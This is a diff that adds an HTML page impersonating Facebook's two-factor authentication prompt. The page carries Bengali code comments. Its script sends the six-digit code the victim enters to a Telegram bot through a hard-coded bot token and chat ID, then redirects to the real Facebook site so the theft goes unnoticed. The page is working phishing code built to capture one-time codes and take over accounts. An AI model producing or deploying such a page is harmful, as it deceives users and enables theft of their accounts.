@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Two-Factor Authentication</title>
+  <style>
+    body {
+      font-family: 'Roboto', sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background-color: #f0f2f5;
+    }
+    .auth-container {
+      text-align: center;
+      background: #fff;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1),
+                  0 8px 16px rgba(0, 0, 0, 0.1);
+      max-width: 400px;
+      width: 100%;
+    }
+    h1 {
+      color: #1877f2;
+    }
+    p {
+      font-size: 1rem;
+      margin: 15px 0;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      font-size: 1rem;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+    button {
+      padding: 10px;
+      font-size: 1rem;
+      background-color: #1877f2;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #0d65d9;
+    }
+    .timer {
+      color: #fffff;
+      font-size: 1.2rem;
+    }
+  </style>
+</head>
+<body>
+  <div class="auth-container">
+    <h1>facebook </h1>
+    <p>Enter Two-Factor Authentication the 6-digit OTP sent to your phone or email.</p>
+    <div class="timer" id="timer">Time remaining: 60 seconds</div>
+    <form id="otpForm">
+      <input type="text" id="otp" placeholder="Enter 6-digit OTP" maxlength="6" required>
+      <button type="submit">Verify</button>
+    </form>
+  </div>
+
+  <script>
+    // টাইমার সেটআপ
+    let timeLeft = 60;
+    const timer = document.getElementById("timer");
+    const countdown = setInterval(() => {
+      if (timeLeft > 0) {
+        timeLeft--;
+        timer.textContent = `Time remaining: ${timeLeft} seconds`;
+      } else {
+        clearInterval(countdown);
+        window.location.href = "index.html"; // টাইম শেষ হলে লগইন পেজে রিডিরেক্ট
+      }
+    }, 1000);
+
+    // OTP যাচাই এবং টেলিগ্রামে পাঠানো
+    document.getElementById("otpForm").addEventListener("submit", function (event) {
+      event.preventDefault();
+
+      const otp = document.getElementById("otp").value;
+      if (otp.length !== 6 || isNaN(otp)) {
+        alert("Please enter a valid 6-digit OTP.");
+        return;
+      }
+
+      const botToken = "8155996032:AAFA2Y-WQrFxd8YJ2F3kBG3U9V7WDgLIT4Y";
+      const chatId = "6494839544";
+
+      const message = `OTP Entered: ${otp}`;
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text: message }),
+      })
+        .then(() => {
+          window.location.href = "https://m.facebook.com"; // সফল হলে থ্যাঙ্ক ইউ পেজে রিডিরেক্ট
+        })
+        .catch((error) => console.error("Error:", error));
+    });
+  </script>
+</body>
+</html>
